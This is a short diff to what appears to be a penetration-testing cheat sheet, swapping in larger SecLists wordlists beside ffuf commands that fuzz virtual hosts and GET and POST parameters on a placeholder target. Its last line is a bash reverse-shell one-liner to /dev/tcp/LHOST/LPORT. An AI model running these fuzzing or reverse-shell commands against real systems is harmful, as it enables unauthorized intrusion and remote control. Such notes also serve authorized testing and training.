@@ -5,9 +5,11 @@ ffuf -w wordlist:FUZZ -u http://TARGET/ -H 'Host: FUZZ.TARGET' -fs xxx
 ffuf -w wordlist:FUZZ -u http://TARGET/admin/admin.php?id=FUZZ -fs xxx
 ffuf -w wordlist:FUZZ -u http://TARGET/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
 
-SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
+SecLists/Discovery/Web-Content/raft-large-words.txt
+SecLists/Discovery/Web-Content/raft-large-directories.txt
+SecLists/Discovery/Web-Content/raft-large-files.txt
+SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 SecLists/Discovery/Web-Content/web-extensions.txt
-SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 SecLists/Discovery/Web-Content/burp-parameter-names.txt
 
 bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
